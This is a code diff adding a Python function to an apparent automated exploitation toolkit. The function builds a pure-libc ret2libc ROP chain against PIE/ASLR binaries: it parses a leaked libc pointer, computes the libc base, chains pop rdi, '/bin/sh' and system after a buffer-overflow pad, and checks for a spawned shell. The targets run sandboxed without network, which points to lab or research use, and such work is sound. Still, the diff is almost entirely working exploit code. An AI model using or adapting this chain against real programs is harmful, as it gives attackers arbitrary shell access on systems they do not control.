@@ -284,3 +284,107 @@ def ret2libc_leak(exe, workdir, *, offset, pop_rdi, puts_plt, puts_got, ret_to,
                     pass
     return {"ok": False, "reason": "no shell confirmed (leak captured but ret2libc did not spawn a "
                                    "shell under either stack alignment)", "leaked": last_leaked}
+
+
+# --- analyst-assisted PIE ret2libc (pure-libc ROP; no pie_base needed) --------------------------
+def analyst_ret2libc(exe, workdir, *, offset, libc_data, leak_offset=None, leak_sym=None,
+                     leak_trigger: bytes = b"", leak_regex: str = r"0x[0-9a-fA-F]+",
+                     leak_index=None, base_argv=(), marker: bytes = b"LYKOS-PIE-R2L-9931",
+                     timeout: float = 8.0, mem_mb: int = 2048) -> dict:
+    """PIE/ASLR ret2libc where the ANALYST makes the leak deterministic.
+
+    A PIE target's own gadgets are unusable until pie_base is known, and recovering pie_base (or
+    libc_base) generically from a `%p` dump is target/libc-specific (which slot, which symbol, a
+    version-specific return offset). Instead the analyst supplies what they identified: a
+    `leak_trigger` that discloses a LIBC pointer and either the symbol it points to (`leak_sym`)
+    or its raw libc offset (`leak_offset`), so `libc_base = leaked - leak_offset`. The chain is then
+    a PURE-LIBC ROP -- `pop rdi; ret` and the `ret` pad come from libc too -- so it never needs
+    pie_base. `leak_regex` extracts hex pointers; `leak_index` picks which match (default: the first
+    whose subtraction yields a page-aligned base). Success is a spawned shell echoing `marker`.
+    """
+    import re as _re
+    import struct as _struct
+
+    from . import rop
+    if leak_offset is None:
+        if not leak_sym:
+            return {"ok": False, "reason": "need leak_sym or leak_offset (the leaked libc pointer)"}
+        leak_offset = rop.libc_symbols(libc_data, (leak_sym,)).get(leak_sym)
+        if leak_offset is None:
+            return {"ok": False, "reason": f"leak_sym {leak_sym!r} not in libc .dynsym"}
+    pop_rdi = rop.find_gadget(libc_data, "pop_rdi")
+    ret_g = rop.find_gadget(libc_data, "ret")
+    binsh = rop.find_string(libc_data, b"/bin/sh")
+    system = rop.libc_symbols(libc_data, ("system",)).get("system")
+    if not (pop_rdi and binsh and system):
+        return {"ok": False, "reason": "libc lacks a pop-rdi gadget / \"/bin/sh\" / system"}
+    rx = _re.compile(leak_regex.encode("latin-1"))
+    q = lambda v: _struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)      # noqa: E731
+    exedir = str(Path(exe).resolve().parent)
+    argv = [str(a) for a in base_argv]
+    last = None
+    for pad in (0, 1):                                            # stage alignment: even, then odd
+        for _ in range(3):
+            preexec = sandbox._rlimits(mem_mb, int(timeout) + 2, set_as=True)
+            cmd = sandbox.isolate_prefix(exedir, net=False, rw_binds=[exedir]) + [str(exe)] + argv
+            try:
+                p = subprocess.Popen(cmd, stdin=subprocess.PIPE, stdout=subprocess.PIPE,
+                                     stderr=subprocess.STDOUT, cwd=exedir,
+                                     start_new_session=True, preexec_fn=preexec)
+            except Exception as e:                               # noqa: BLE001
+                return {"ok": False, "reason": f"spawn failed: {e!r}"}
+            try:
+                if leak_trigger:
+                    try:
+                        p.stdin.write(leak_trigger)
+                        p.stdin.flush()
+                    except (BrokenPipeError, OSError):
+                        continue
+                burst = _read_until(p, time.time() + timeout / 2)
+                vals = []
+                for m in rx.finditer(burst):
+                    try:
+                        vals.append(int(m.group(0), 16))
+                    except ValueError:
+                        pass
+                cands = [vals[leak_index]] if (leak_index is not None and
+                                               -len(vals) <= leak_index < len(vals)) else vals
+                base = None
+                for v in cands:
+                    b = v - leak_offset
+                    if b > 0 and b % 0x1000 == 0:                # a real libc base is page-aligned
+                        base, last = b, b
+                        break
+                if base is None:
+                    continue
+                chain = bytearray(b"A" * offset)
+                if pad:
+                    chain += q(base + ret_g)
+                chain += q(base + pop_rdi) + q(base + binsh) + q(base + system)
+                try:
+                    p.stdin.write(bytes(chain))
+                    p.stdin.flush()
+                    time.sleep(0.3)
+                    p.stdin.write(b"echo " + marker + b"\n")
+                    p.stdin.flush()
+                except (BrokenPipeError, OSError):
+                    break                                        # wrong parity: crashed
+                out = _read_until(p, time.time() + timeout, quiet=1.5)
+                if marker in out:
+                    return {"ok": True, "base": base, "system": base + system,
+                            "binsh": base + binsh, "pad": pad,
+                            "output": out[:400].decode("latin-1", "ignore")}
+            finally:
+                for s in (p.stdin, p.stdout):
+                    try:
+                        if s is not None:
+                            s.close()
+                    except Exception:                            # noqa: BLE001
+                        pass
+                _kill(p)
+                try:
+                    p.wait(timeout=2)
+                except Exception:                                # noqa: BLE001
+                    pass
+    return {"ok": False, "reason": "no shell confirmed (leak parsed but the pure-libc chain did not "
+                                   "spawn a shell under either alignment)", "base": last}
